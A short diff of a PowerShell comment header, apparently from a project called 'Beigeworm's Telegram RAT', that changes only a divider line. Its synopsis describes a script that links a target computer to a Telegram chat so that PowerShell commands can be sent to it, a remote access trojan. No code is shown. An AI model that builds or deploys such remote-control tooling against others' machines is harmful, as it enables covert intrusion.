@@ -1,5 +1,5 @@
 <#
-============================================= Beigeworm's Telegram RAT ========================================================
+============================================= Beigeworm's Telegram RAT =======================================================
 
 SYNOPSIS
 This script connects target computer with a telegram chat to send powershell commands.
